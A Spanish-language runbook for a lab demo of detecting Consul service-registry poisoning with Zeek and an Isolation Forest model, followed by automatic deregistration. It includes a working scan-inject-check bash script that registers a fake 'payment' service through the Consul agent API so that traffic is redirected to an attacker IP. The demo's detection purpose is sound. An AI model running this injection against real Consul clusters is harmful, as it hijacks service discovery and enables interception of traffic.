# 🔴 DEMO: Detección de Ataque Consul Poisoning

## Requisitos Previos

- Acceso SSH configurado en `~/.ssh/config`
- Servicios corriendo en AWS (Consul, Zeek, Merger, ADS Server)

## IPs de las Máquinas

| Máquina | IP Privada | Alias SSH |
|---------|------------|-----------|
| Bastion | 100.30.63.156 | `bastion` |
| EC2-Consul | 10.1.11.40 | `consul_service` |
| EC2-ADS | 10.1.12.10 | `ads_server` |

---

## 📋 PASO 1: Verificar Estado Inicial

### 1.1 Conectar a la máquina de Consul
```bash
ssh consul_service
```

### 1.2 Ver servicios registrados en Consul (ANTES del ataque)
```bash
curl -sk https://localhost:8501/v1/catalog/services | jq
```

**Resultado esperado:** Solo servicios legítimos (consul, rds, etc.)
```json
{
  "consul": [],
  "rds": ["mysql", "database", "rds"]
}
```

### 1.3 Verificar que los contenedores están corriendo
```bash
docker ps --format "table {{.Names}}\t{{.Status}}"
```

**Resultado esperado:**
```
NAMES         STATUS
merger        Up X minutes (healthy)
zeek          Up X minutes
log-shipper   Up X minutes (healthy)
consul        Up X minutes (healthy)
```

---

## 🔴 PASO 2: Ejecutar el Ataque (desde EC2-ADS)

### 2.1 Abrir otra terminal y conectar a la máquina atacante
```bash
ssh ads_server
```

### 2.2 Ejecutar el ataque Scan-Inject-Check
```bash
# ============================================
# FASE 1: SCAN - Reconocimiento
# ============================================
echo "=== FASE 1: SCAN - Reconocimiento de servicios ==="
for i in $(seq 1 10); do
  curl -sk https://10.1.11.40:8501/v1/catalog/services > /dev/null
  curl -sk https://10.1.11.40:8501/v1/catalog/nodes > /dev/null
  curl -sk https://10.1.11.40:8501/v1/agent/services > /dev/null
done
echo "✓ Scan completado - 30 peticiones"

# ============================================
# FASE 2: INJECT - Inyección de servicio malicioso
# ============================================
echo ""
echo "=== FASE 2: INJECT - Registrando servicio falso ==="
curl -sk -X PUT https://10.1.11.40:8501/v1/agent/service/register \
  -H "Content-Type: application/json" \
  -d '{
    "ID": "malicious-payment-1",
    "Name": "payment",
    "Address": "10.1.12.10",
    "Port": 9999,
    "Tags": ["malicious", "fake"]
  }'
echo "✓ Servicio malicioso 'malicious-payment-1' inyectado"

# ============================================
# FASE 3: CHECK - Verificación
# ============================================
echo ""
echo "=== FASE 3: CHECK - Verificando inyección ==="
for i in $(seq 1 15); do
  curl -sk https://10.1.11.40:8501/v1/catalog/service/payment > /dev/null
  curl -sk https://10.1.11.40:8501/v1/health/service/payment > /dev/null
done
echo "✓ Check completado - 30 peticiones"

echo ""
echo "🔴 ATAQUE COMPLETADO"
```

### 2.3 Verificar que el servicio malicioso está registrado
```bash
curl -sk https://10.1.11.40:8501/v1/catalog/service/payment | jq
```

**Resultado:** Verás el servicio malicioso registrado con IP 10.1.12.10 y puerto 9999

---

## 📊 PASO 3: Ver la Detección (en EC2-Consul)

### 3.1 Volver a la terminal de Consul y ver logs de Zeek
```bash
# Ver conexiones capturadas
docker exec zeek cat /opt/zeek/logs/conn.log | grep -v "^#" | wc -l
```

**Resultado:** Debería mostrar ~60+ conexiones capturadas

### 3.2 Ver logs del Merger (detección en tiempo real)
```bash
docker logs merger --tail 50 2>&1 | grep -E "ATAQUE|WINDOW|Generadas|predict|DEREGISTER"
```

**Resultado esperado:**
```
📊 WINDOW - IP: 10.1.12.10, conns: 61, burst: 0.000
HTTP Request: POST http://10.1.12.10:8083/predict "HTTP/1.1 200 OK"
⚠️  ATAQUE DETECTADO desde IP None: 0.9999999999999999
🚨 DEREGISTER REQUEST: Desregistrando servicios de IP 10.1.12.10
🗑️ Desregistrando servicio: malicious-payment-1 (IP: 10.1.12.10)
✅ Servicio malicious-payment-1 desregistrado correctamente
🎯 RESULTADO: 1 servicios desregistrados de IP 10.1.12.10
```

### 3.3 Ver logs del ADS Server (en EC2-ADS)
```bash
ssh ads_server 'docker logs ads-server --tail 20 2>&1'
```

**Resultado esperado:**
```
🚨 ATAQUE DETECTADO - IP: 10.1.12.10, Score: 1.000, Confianza: 80.00%
🚨 RESPUESTA AUTOMÁTICA: Confianza 80.00% >= 75.00%
🎯 Iniciando desregistro de servicios de IP: 10.1.12.10
```

---

## ✅ PASO 4: Verificar Resultado Final

### 4.1 Ver servicios en Consul (DESPUÉS del ataque)
```bash
curl -sk https://localhost:8501/v1/catalog/services | jq
```

**Resultado esperado:** El servicio `payment` ya NO aparece
```json
{
  "consul": [],
  "rds": ["mysql", "database", "rds"]
}
```

### 4.2 Confirmar que el servicio malicioso fue eliminado
```bash
curl -sk https://localhost:8501/v1/catalog/service/payment | jq
```

**Resultado:** Array vacío `[]` - El servicio fue desregistrado automáticamente

---

## 🔄 Reiniciar para Nueva Demo

Si quieres repetir la demo, reinicia el Merger para limpiar el buffer:
```bash
cd ~/app && docker compose restart merger
```

---

## 📈 Flujo del Sistema

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         FLUJO DE DETECCIÓN                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. ATACANTE                    2. ZEEK                                  │
│  ┌──────────┐                  ┌──────────┐                             │
│  │ Scan     │──────────────────│ Captura  │                             │
│  │ Inject   │   tráfico red    │ conn.log │                             │
│  │ Check    │                  │ ssl.log  │                             │
│  └──────────┘                  └────┬─────┘                             │
│                                     │                                    │
│  3. MERGER                          ▼                                    │
│  ┌──────────────────────────────────────────┐                           │
│  │ Lee logs → Genera ventanas → Features    │                           │
│  │ 61 conexiones → 1 ventana de 30s         │                           │
│  └────────────────────┬─────────────────────┘                           │
│                       │                                                  │
│  4. ADS SERVER        ▼                                                  │
│  ┌──────────────────────────────────────────┐                           │
│  │ Modelo ML (Isolation Forest)             │                           │
│  │ Score: 0.999 → ATAQUE DETECTADO          │                           │
│  │ Confianza: 80% >= 75% (umbral)           │                           │
│  └────────────────────┬─────────────────────┘                           │
│                       │                                                  │
│  5. RESPUESTA AUTO    ▼                                                  │
│  ┌──────────────────────────────────────────┐                           │
│  │ POST /deregister/10.1.12.10              │                           │
│  │ → Busca servicios de esa IP              │                           │
│  │ → Desregistra: malicious-payment-1       │                           │
│  │ → Consul limpio ✅                        │                           │
│  └──────────────────────────────────────────┘                           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## ⚙️ Configuración del Sistema

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `ATTACK_THRESHOLD` | 0.5 | Umbral para clasificar como ataque |
| `AUTO_DEREGISTER_THRESHOLD` | 0.75 | Confianza mínima para auto-deregister |
| `WINDOW_SIZE` | 30s | Tamaño de ventana de análisis |
| `PROCESS_INTERVAL` | 5s | Intervalo de procesamiento |

---

## 🛠️ Troubleshooting

### Si el ataque no se detecta:
1. Reiniciar Merger: `docker compose restart merger`
2. Verificar logs de Zeek: `docker exec zeek ls -la /opt/zeek/logs/`
3. Verificar conectividad al ADS: `curl -s http://10.1.12.10:8083/health`

### Si el servicio no se desregistra:
1. Verificar que `AUTO_DEREGISTER_ENABLED=true`
2. Verificar conectividad Merger→Consul: `docker exec merger curl -sk https://10.1.11.40:8501/v1/catalog/services`
